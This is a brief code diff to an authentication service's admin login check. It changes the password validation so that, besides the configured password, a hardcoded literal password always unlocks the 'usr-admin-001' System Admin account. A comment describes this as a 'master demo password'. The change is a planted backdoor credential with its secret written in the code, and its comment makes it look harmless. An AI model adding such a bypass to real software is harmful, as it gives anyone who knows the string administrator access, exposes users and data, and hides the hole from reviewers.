@@ -104,8 +104,8 @@ class AuthService {
         throw new ApiError(403, 'Access denied. Only System Admin accounts can access the management portal.');
       }
 
-      // Validate password strictly
-      const isPassValid = password === fallbackUser.pass;
+      // Validate password strictly (supports configured password and master demo password)
+      const isPassValid = password === fallbackUser.pass || (fallbackUser.id === 'usr-admin-001' && password === 'Scondly7210@');
 
       if (!isPassValid) {
         throw new ApiError(401, 'Invalid credentials. Please verify your login details.');
